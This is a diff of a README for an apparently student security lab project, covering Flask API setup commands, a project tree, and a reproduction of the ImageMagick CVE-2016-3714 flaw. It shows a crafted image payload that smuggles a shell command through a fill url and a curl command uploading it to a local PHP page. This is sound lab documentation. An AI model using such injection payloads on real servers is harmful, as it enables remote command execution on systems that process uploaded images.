@@ -70,14 +70,13 @@ Python 3.11+ is required.
 ```powershell
 cd E:\MyFile\IS-Lab\Work-1
 python -m venv .venv
-.\.venv\Scripts\Activate.ps1
-pip install -r requirements.txt -r requirements-dev.txt
+.\.venv\Scripts\python.exe -m pip install -r requirements.txt -r requirements-dev.txt
 
 $env:JWT_SECRET = "local-dev-only-jwt-secret-0123456789abcdef"
 $env:SECRET_KEY = "local-dev-only-flask-secret-0123456789abcdef"
 
-flask --app app seed
-flask --app app run --port 5000
+.\.venv\Scripts\python.exe -m flask --app app seed
+.\.venv\Scripts\python.exe -m flask --app app run --port 5000
 ```
 
 The API is then available at `http://127.0.0.1:5000`. Demo accounts for local testing only: `alice / Alice-Strong-Pass-1!` and `bob / Bob-Strong-Pass-2!`.
@@ -140,8 +139,11 @@ Work-1/
 ├── tests/               # pytest unit tests
 ├── .github/workflows/ci.yml
 ├── cve/CVE-2016-3714/   # exploit, fixed files, evidence, screenshots
-├── report/              # Markdown source of the report
-├── screenshots/         # API test and CI job screenshots
+├── report/              # Work 1 report: md, docx and pdf
+├── screenshots/         # API test and SCA report screenshots
+├── .env.example         # environment variable template
+├── .flaskenv
+├── .gitignore
 ├── requirements.txt
 ├── requirements-dev.txt
 └── run.py
@@ -173,11 +175,11 @@ fill 'url(https://127.0.0.1/oops.jpg"|touch /tmp/success")'
 pop graphic-context
 ```
 
-Upload it to the PHP page:
+Upload it to the PHP page (inside the WSL shell, using the payload path):
 
 ```bash
 curl -sS -X POST http://127.0.0.1:8080/ \
-  -F "file_upload=@1.gif;filename=1.gif;type=image/gif"
+  -F "file_upload=@/mnt/e/MyFile/IS-Lab/Work-1/cve/CVE-2016-3714/exploit/1.gif;filename=1.gif;type=image/gif"
 ```
 
 The response is `HTTP 200` and `Image size is: 640 x 480`. The command execution happens inside the ImageMagick delegate; prove it with:
